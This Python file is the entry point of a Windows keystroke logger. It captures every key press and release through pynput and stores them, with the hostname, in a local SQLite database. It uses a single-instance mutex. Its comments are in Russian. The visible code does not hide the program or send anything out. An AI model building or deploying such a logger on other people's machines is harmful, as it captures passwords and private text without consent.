import socket
import sys
import logging
from queue import Queue
from datetime import datetime, timezone

import win32event
import win32api
import winerror
from pynput import keyboard

import connection
from key_listener import KeyListener
from key_writer import KeyWriter

logger = logging.getLogger(__name__)


def acquire_mutex():
    """Гарантирует что запущен только один экземпляр программы."""
    mutex = win32event.CreateMutex(None, False, "KeyboardLoggerMutex")
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        logger.warning("Another instance is already running, exiting.")
        sys.exit(0)
    return mutex  # возвращаем, чтобы объект не был уничтожен сборщиком мусора


def start_session(db_path: str):
    conn = connection.get_connection(db_path)

    started_at = datetime.now(tz=timezone.utc).timestamp()
    hostname = socket.gethostname()
    cursor = conn.execute(
        """
        INSERT INTO sessions (started_at, hostname)
        VALUES (?, ?)
        """,
        (started_at, hostname)
    )
    session_id = cursor.lastrowid
    conn.commit()
    conn.close()
    logger.info("Session started: id=%s, hostname=%s", session_id, hostname)

    key_buffer = Queue()
    key_logger = KeyListener(key_buffer)
    key_writer = KeyWriter(key_buffer, db_path, session_id)

    listener = keyboard.Listener(
        on_press=key_logger.on_press,
        on_release=key_logger.on_release
    )

    key_writer.start()
    listener.start()
    logger.info("Listener started, waiting for key events...")

    try:
        listener.join()
    except KeyboardInterrupt:
        pass
    finally:
        listener.stop()
        key_writer.stop()
        conn = connection.get_connection(db_path)
        ended_at = datetime.now(tz=timezone.utc).timestamp()
        conn.execute(
            """
            UPDATE sessions
            SET ended_at = ?
            WHERE id = ?
            """,
            (ended_at, session_id)
        )
        conn.commit()
        conn.close()
        logger.info("Session ended: id=%s, ended_at=%s", session_id, ended_at)


def main():
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        handlers=[
            logging.FileHandler("keylogger.log", encoding="utf-8"),
        ]
    )

    mutex = acquire_mutex()  # переменная должна жить до конца программы

    db_path = "app.db"
    start_session(db_path)


if __name__ == "__main__":
    main()